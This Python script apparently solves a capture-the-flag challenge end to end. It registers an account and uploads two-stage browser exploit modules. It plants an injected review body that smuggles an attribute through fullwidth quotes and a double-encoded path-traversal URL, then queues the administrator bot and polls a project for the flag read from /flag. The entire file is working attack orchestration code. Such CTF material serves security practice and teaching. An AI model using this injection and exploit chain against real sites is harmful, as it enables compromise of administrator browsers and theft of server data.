#!/usr/bin/env python3
"""UHCON 2026 Final / Bot end-to-end solver.

The solver uploads the prepared two-stage browser exploit, creates the archived
review-body injection, queues the administrator bot, and polls a separate
attacker-owned result project until the browser-process payload writes /flag.

Only Python's standard library is required.  HTTP exchanges are archived as
ARTEX-style JSONL evidence under work/artex_evidence/.
"""

from __future__ import annotations

import argparse
import hashlib
import http.cookiejar
import json
import re
import secrets
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parent
DEFAULT_BASE = "http://challenge.local:3000"
DEFAULT_STAGE1 = ROOT / "stage1_final.mjs"
DEFAULT_STAGE2 = ROOT / "stage2_final.mjs"
ASSET_LIMIT = 1024 * 1024


def sha256(raw: bytes) -> str:
    return hashlib.sha256(raw).hexdigest()


def resolve_file(value: str | Path) -> Path:
    path = Path(value).expanduser()
    if not path.is_absolute():
        path = ROOT / path
    path = path.resolve()
    if not path.is_file():
        raise FileNotFoundError(path)
    return path


class ChallengeClient:
    def __init__(self, base: str, evidence_path: Path, run_id: str) -> None:
        self.base = base.rstrip("/")
        self.evidence_path = evidence_path
        self.run_id = run_id
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def _record(
        self,
        role: str,
        method: str,
        url: str,
        request_headers: dict[str, str],
        request_body: bytes,
        response: Any,
        response_body: bytes,
    ) -> None:
        item = {
            "run_id": self.run_id,
            "captured_at_ms": int(time.time() * 1000),
            "role": role,
            "method": method,
            "url": url,
            "status": response.status,
            "request": {
                "headers": request_headers,
                "length": len(request_body),
                "sha256": sha256(request_body),
                "body_utf8": request_body.decode("utf-8", "replace"),
            },
            "response": {
                "headers": dict(response.headers.items()),
                "length": len(response_body),
                "sha256": sha256(response_body),
                "body_utf8": response_body.decode("utf-8", "replace"),
            },
        }
        with self.evidence_path.open("a", encoding="utf-8") as stream:
            stream.write(json.dumps(item, ensure_ascii=False) + "\n")

    def request(
        self,
        role: str,
        path: str,
        method: str = "GET",
        payload: Any | None = None,
        *,
        expect_json: bool = True,
        timeout: float = 20,
    ) -> tuple[int, Any, bytes]:
        url = self.base + path
        body = b"" if payload is None else json.dumps(payload, ensure_ascii=False).encode()
        headers = {"User-Agent": "UHCON-Bot-Solver/2.0"}
        if payload is not None:
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            url,
            data=None if payload is None else body,
            headers=headers,
            method=method,
        )
        try:
            with self.opener.open(request, timeout=timeout) as response:
                raw = response.read()
                self._record(
                    role,
                    method,
                    url,
                    dict(request.header_items()),
                    body,
                    response,
                    raw,
                )
                if not expect_json:
                    decoded: Any = raw.decode("utf-8", "replace")
                else:
                    decoded = json.loads(raw) if raw else None
                return response.status, decoded, raw
        except urllib.error.HTTPError as error:
            raw = error.read()
            self._record(
                role,
                method,
                url,
                dict(request.header_items()),
                body,
                error,
                raw,
            )
            raise RuntimeError(
                f"{method} {path}: HTTP {error.code}: "
                f"{raw.decode('utf-8', 'replace')}"
            ) from error


def render_module(template: str, replacements: dict[str, str], name: str) -> str:
    result = template
    for needle, value in replacements.items():
        result = result.replace(needle, value)
    unresolved = sorted(set(re.findall(r"__[A-Z0-9_]+__", result)))
    if unresolved:
        raise RuntimeError(f"{name}: unresolved placeholders: {', '.join(unresolved)}")
    encoded = result.encode("utf-8")
    if not encoded or len(encoded) > ASSET_LIMIT:
        raise RuntimeError(f"{name}: invalid asset size {len(encoded)} bytes")
    return result


def validate_templates(stage1: str, stage2: str) -> None:
    stage1_required = (
        "__USERNAME_JSON__",
        "__PASSWORD_JSON__",
        "__OUTPUT_PROJECT_JSON__",
        "__STAGE2_URL_JSON__",
        "dictionaryPrimitives",
    )
    stage2_required = (
        "__USERNAME_JSON__",
        "__PASSWORD_JSON__",
        "__OUTPUT_PROJECT_JSON__",
        "const targetOfs = Number(params.get('ofs') || '8');",
        "FULL_VIRTUAL_AAR_OK",
        "MOJO_FSOP_ARMED",
        "readFileSync('/flag'",
    )
    for marker in stage1_required:
        if marker not in stage1:
            raise RuntimeError(f"stage1 is missing required marker: {marker}")
    for marker in stage2_required:
        if marker not in stage2:
            raise RuntimeError(f"stage2 is missing required marker: {marker}")


def wait_for_empty_queue(client: ChallengeClient, timeout: int) -> None:
    deadline = time.time() + timeout
    last_pending: int | None = None
    while time.time() < deadline:
        health = client.request("baseline", "/health")[1]
        queue = health.get("reviewQueue") or {}
        if not queue.get("available", False):
            raise RuntimeError("review queue is unavailable")
        pending = int(queue.get("pending", 0))
        if pending != last_pending:
            print(f"[*] review queue pending={pending}")
            last_pending = pending
        if pending == 0:
            return
        time.sleep(2)
    raise TimeoutError(f"review queue did not drain within {timeout} seconds")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE, help="challenge web origin")
    parser.add_argument("--stage1", default=str(DEFAULT_STAGE1))
    parser.add_argument("--stage2", default=str(DEFAULT_STAGE2))
    parser.add_argument("--timeout", type=int, default=180, help="result wait seconds")
    parser.add_argument(
        "--attempts",
        type=int,
        default=3,
        help="fresh bot visits to try (the renderer primitive is probabilistic)",
    )
    parser.add_argument(
        "--queue-timeout", type=int, default=240, help="pre-submit queue wait seconds"
    )
    parser.add_argument(
        "--no-wait-queue",
        action="store_true",
        help="submit immediately even when another visit is pending",
    )
    parser.add_argument(
        "--flag-regex",
        default=r"(?:UHCON|UHC|FLAG)\{[^}\r\n]+\}",
        help="regular expression used to recognize the recovered flag",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    if args.timeout < 10 or args.queue_timeout < 1 or args.attempts < 1:
        raise SystemExit("timeouts must be positive and result timeout must be >= 10")

    stage1_path = resolve_file(args.stage1)
    stage2_path = resolve_file(args.stage2)
    stage1_template = stage1_path.read_text(encoding="utf-8")
    stage2_template = stage2_path.read_text(encoding="utf-8")
    validate_templates(stage1_template, stage2_template)

    evidence_dir = ROOT / "work" / "artex_evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_id = time.strftime("%Y%m%d-%H%M%S") + "-" + secrets.token_hex(3)
    evidence_path = evidence_dir / f"{run_id}-solver.jsonl"
    summary_path = evidence_dir / f"{run_id}-solver-summary.json"
    flag_path = evidence_dir / f"{run_id}-flag.txt"
    client = ChallengeClient(args.base, evidence_path, run_id)

    username = "bot" + secrets.token_hex(6)
    password = "P!" + secrets.token_urlsafe(18)
    print(f"[*] run={run_id} target={client.base}")
    health = client.request("baseline", "/health")[1]
    print(f"[+] health={health}")
    client.request(
        "setup",
        "/api/register",
        "POST",
        {"username": username, "password": password},
    )
    owner = client.request("setup", "/api/me")[1]
    owner_id = str(owner["id"])
    print(f"[+] account={username} owner_id={owner_id}")

    output_id = client.request(
        "setup",
        "/api/projects",
        "POST",
        {"name": "exploit-output", "body": "PENDING:" + run_id},
    )[1]["id"]
    common = {
        "__USERNAME_JSON__": json.dumps(username),
        "__PASSWORD_JSON__": json.dumps(password),
        "__OUTPUT_PROJECT_JSON__": json.dumps(output_id),
    }

    stage2_source = render_module(stage2_template, common, "stage2")
    stage2_asset = client.request(
        "setup", "/api/assets", "POST", {"source": stage2_source}
    )[1]
    stage2_id = stage2_asset["id"]
    stage2_url = stage2_asset["url"]

    stage1_replacements = dict(common)
    stage1_replacements["__STAGE2_URL_JSON__"] = json.dumps(stage2_url)
    stage1_source = render_module(stage1_template, stage1_replacements, "stage1")
    stage1_asset = client.request(
        "setup", "/api/assets", "POST", {"source": stage1_source}
    )[1]
    stage1_id = stage1_asset["id"]
    print(
        f"[+] assets stage1={stage1_id} ({len(stage1_source.encode())} bytes) "
        f"stage2={stage2_id} ({len(stage2_source.encode())} bytes)"
    )

    policy_url = (
        "http://assets.challenge.local:3000/u/previews/"
        f"%252F..%252F..%252Fu%252F{owner_id}%252F{stage1_id}.mjs"
    )
    archived = (
        "![p](/static/review/sample.svg?x=＂data-preview-module=＂"
        + policy_url
        + "＂x=＂)"
    )
    exploit_id = client.request(
        "setup",
        "/api/projects",
        "POST",
        {"name": "module-trigger", "body": archived},
    )[1]["id"]
    client.request(
        "setup",
        f"/api/projects/{exploit_id}",
        "PUT",
        {
            "name": "module-trigger",
            "body": "![p](/static/review/sample.svg?current=1)",
        },
    )
    review_status, _, review_raw = client.request(
        "verification", f"/review/{exploit_id}", expect_json=False
    )
    print(f"[+] trigger project={exploit_id} owner-review={review_status}/{len(review_raw)}")

    flag_pattern = re.compile(args.flag_regex)
    last_body = ""
    recovered_flag: str | None = None
    attempt_results: list[dict[str, Any]] = []
    for attempt in range(1, args.attempts + 1):
        pending_marker = f"PENDING:{run_id}:attempt-{attempt}"
        client.request(
            "setup",
            f"/api/projects/{output_id}",
            "PUT",
            {"name": "exploit-output", "body": pending_marker},
        )
        last_body = pending_marker
        if not args.no_wait_queue:
            wait_for_empty_queue(client, args.queue_timeout)
        queued = client.request(
            "proof", f"/api/projects/{exploit_id}/report", "POST", {}
        )[1]
        print(f"[+] bot attempt {attempt}/{args.attempts} queued: {queued}")

        attempt_info: dict[str, Any] = {
            "attempt": attempt,
            "queued": queued,
            "started_at_ms": int(time.time() * 1000),
        }
        deadline = time.time() + args.timeout
        terminal_error = False
        while time.time() < deadline:
            project = client.request(
                "verification", f"/api/projects/{output_id}"
            )[1]
            body = str(project.get("body", ""))
            if body != last_body:
                print(f"[>] attempt {attempt} output: {body}", flush=True)
                last_body = body
            match = flag_pattern.search(body)
            if match:
                recovered_flag = match.group(0)
                break
            if body != pending_marker and (
                "STAGE1_ERROR" in body or "STAGE2_ERROR" in body
            ):
                terminal_error = True
                break
            time.sleep(2)
        attempt_info.update(
            {
                "finished_at_ms": int(time.time() * 1000),
                "last_output": last_body,
                "terminal_error": terminal_error,
                "flag_observed": recovered_flag is not None,
            }
        )
        attempt_results.append(attempt_info)
        if recovered_flag is not None:
            break
        if attempt < args.attempts:
            print("[*] no flag in this visit; preparing a fresh bot visit")

    result = {
        "run_id": run_id,
        "base": client.base,
        "success": recovered_flag is not None,
        "flag": recovered_flag,
        "username": username,
        "password": password,
        "owner_id": owner_id,
        "stage1_path": str(stage1_path),
        "stage1_template_sha256": sha256(stage1_template.encode()),
        "stage1_rendered_sha256": sha256(stage1_source.encode()),
        "stage1_asset_id": stage1_id,
        "stage2_path": str(stage2_path),
        "stage2_template_sha256": sha256(stage2_template.encode()),
        "stage2_rendered_sha256": sha256(stage2_source.encode()),
        "stage2_asset_id": stage2_id,
        "stage2_url": stage2_url,
        "exploit_project_id": exploit_id,
        "output_project_id": output_id,
        "attempts": attempt_results,
        "last_output": last_body,
        "evidence_jsonl": str(evidence_path),
    }
    summary_path.write_text(
        json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    if recovered_flag is None:
        raise SystemExit(
            f"[-] flag was not observed within {args.timeout}s; "
            f"last output: {last_body!r}"
        )
    flag_path.write_text(recovered_flag + "\n", encoding="utf-8")
    print(f"[FLAG] {recovered_flag}")
    print(f"[+] evidence={evidence_path}")
    print(f"[+] summary={summary_path}")


if __name__ == "__main__":
    main()
